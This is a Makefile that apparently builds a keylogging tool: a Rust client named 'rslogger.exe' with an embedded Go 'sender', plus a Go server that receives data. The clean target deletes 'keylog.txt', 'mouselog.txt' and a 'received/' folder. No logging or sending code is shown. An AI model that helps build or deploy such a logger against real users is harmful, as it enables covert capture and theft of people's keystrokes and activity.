.PHONY: all client server clean rebuild

all: client server

client: sender
	@echo "Building Rust client with embedded sender..."
	cd client && cargo build --release
	@echo "Client built: client/target/release/rslogger.exe"

sender:
	@echo "Building Go sender..."
	go build -tags sender -ldflags="-s -w" -o client/src/sender.exe client/src/sender.go
	@echo "Sender built: client/src/sender.exe"

server:
	@echo "Building Go server..."
	cd server && go build -tags server -ldflags="-s -w" -o server.exe server.go
	@echo "Server built: server/server.exe"

clean:
	@echo "Cleaning build artifacts..."
	cd client && cargo clean
	rm -f client/src/sender.exe server/server.exe
	rm -f server/go.sum
	rm -f keylog.txt mouselog.txt
	rm -rf received/
	@echo "Clean complete"

rebuild: clean all

test: all
	@echo "Build successful - all binaries created"

install: all
	@echo "Copy target/release/rslogger.exe and server.exe to your desired location"
